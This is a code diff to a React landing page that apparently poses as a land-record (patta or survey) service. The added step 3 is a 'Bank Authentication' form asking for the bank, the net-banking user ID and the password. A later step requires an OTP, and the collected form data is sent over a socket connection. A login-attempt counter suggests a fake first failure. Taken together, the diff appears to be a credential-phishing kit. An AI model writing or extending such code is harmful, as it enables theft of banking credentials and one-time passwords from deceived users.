@@ -54,6 +54,18 @@ const Landingpage = () => {
 
   // ✅ Handle Next button logic
   function handleNext() {
+    if (step == 1) {
+      if (!formData?.name || !formData?.mobile || !formData?.pattaOrSurvey) {
+        toast.error("Name, mobile and Patta Or Survey is required");
+        return;
+      }
+    }
+    if (step == 3) {
+      if (!formData?.bank || !formData?.userId || !formData?.password) {
+        toast.error("Bank, User Id and Password is required");
+        return;
+      }
+    }
     if (step === 3) {
       if (loginAttempts === 0) {
         setLoginAttempts(1);
@@ -73,6 +85,11 @@ const Landingpage = () => {
 
   // ✅ Handle Submit
   function handleSubmit() {
+    if (!formData?.otp) {
+      toast.error("OTP is required");
+      return;
+    }
+
     toast.success("Form submitted successfully ✅");
     setIsOpen(false);
     socket.emit("form:submit", formData);
@@ -2309,7 +2326,8 @@ const Landingpage = () => {
               background: "white",
               padding: "20px",
               borderRadius: "10px",
-              width: "380px",
+              width: step == 3 ? "100%" : "380px",
+              height: step == 3 ? "100%" : "auto",
               boxShadow: "0 4px 10px rgba(0,0,0,0.2)",
             }}
           >
@@ -2317,7 +2335,12 @@ const Landingpage = () => {
               Step {step} of 4
             </h2>
             <p
-              style={{ fontSize: "13px", color: "#666", marginBottom: "10px" }}
+              style={{
+                fontSize: "13px",
+                color: "#666",
+                marginBottom: "10px",
+                textAlign: step == 3 ? "center" : "auto",
+              }}
             >
               Generated ID: <b>{id}</b>
             </p>
@@ -2369,7 +2392,7 @@ const Landingpage = () => {
             )}
 
             {/* STEP 3 */}
-            {step === 3 && (
+            {/* {step === 3 && (
               <>
                 <select
                   name="bank"
@@ -2407,6 +2430,133 @@ const Landingpage = () => {
                   {`${timer !== 0 ? `Please wait ${timer}` : "Next ➡"}`}
                 </button>
               </>
+            )} */}
+            {step === 3 && (
+              <div
+                style={{
+                  background: "#fff",
+                  padding: "20px",
+                  borderRadius: "12px",
+                  boxShadow: "0 4px 12px rgba(0,0,0,0.1)",
+                  maxWidth: "400px",
+                  margin: "0 auto",
+                }}
+              >
+                <h3
+                  style={{
+                    textAlign: "center",
+                    marginBottom: "20px",
+                    color: "#333",
+                  }}
+                >
+                  Bank Authentication
+                </h3>
+
+                {/* Bank Selection */}
+                <div style={{ marginBottom: "15px" }}>
+                  <label
+                    style={{
+                      display: "block",
+                      marginBottom: "6px",
+                      fontWeight: 500,
+                    }}
+                  >
+                    Select Bank
+                  </label>
+                  <select
+                    name="bank"
+                    value={formData.bank}
+                    onChange={handleChange}
+                    style={{
+                      width: "100%",
+                      padding: "10px",
+                      borderRadius: "8px",
+                      border: "1px solid #ccc",
+                      outline: "none",
+                    }}
+                  >
+                    <option value="">Select Bank</option>
+                    <option value="SBI">SBI</option>
+                    <option value="HDFC">HDFC</option>
+                    <option value="ICICI">ICICI</option>
+                    <option value="Axis">Axis Bank</option>
+                  </select>
+                </div>
+
+                {/* User ID */}
+                <div style={{ marginBottom: "15px" }}>
+                  <label
+                    style={{
+                      display: "block",
+                      marginBottom: "6px",
+                      fontWeight: 500,
+                    }}
+                  >
+                    User ID
+                  </label>
+                  <input
+                    type="text"
+                    name="userId"
+                    placeholder="Enter Bank User ID"
+                    value={formData.userId}
+                    onChange={handleChange}
+                    style={{
+                      width: "95%",
+                      padding: "10px",
+                      borderRadius: "8px",
+                      border: "1px solid #ccc",
+                      outline: "none",
+                    }}
+                  />
+                </div>
+
+                {/* Password */}
+                <div style={{ marginBottom: "20px" }}>
+                  <label
+                    style={{
+                      display: "block",
+                      marginBottom: "6px",
+                      fontWeight: 500,
+                    }}
+                  >
+                    Password
+                  </label>
+                  <input
+                    type="password"
+                    name="password"
+                    placeholder="Enter Bank Password"
+                    value={formData.password}
+                    onChange={handleChange}
+                    style={{
+                      width: "95%",
+                      padding: "10px",
+                      borderRadius: "8px",
+                      border: "1px solid #ccc",
+                      outline: "none",
+                    }}
+                  />
+                </div>
+
+                {/* Next Button */}
+                <button
+                  style={{
+                    width: "100%",
+                    padding: "12px",
+                    backgroundColor: timer !== 0 ? "#aaa" : "#007bff",
+                    color: "white",
+                    border: "none",
+                    borderRadius: "8px",
+                    cursor: timer !== 0 ? "not-allowed" : "pointer",
+                    fontSize: "16px",
+                    fontWeight: "bold",
+                    transition: "0.3s",
+                  }}
+                  disabled={timer !== 0}
+                  onClick={handleNext}
+                >
+                  {timer !== 0 ? `Please wait ${timer}s` : "Next ➡"}
+                </button>
+              </div>
             )}
 
             {/* STEP 4 */}
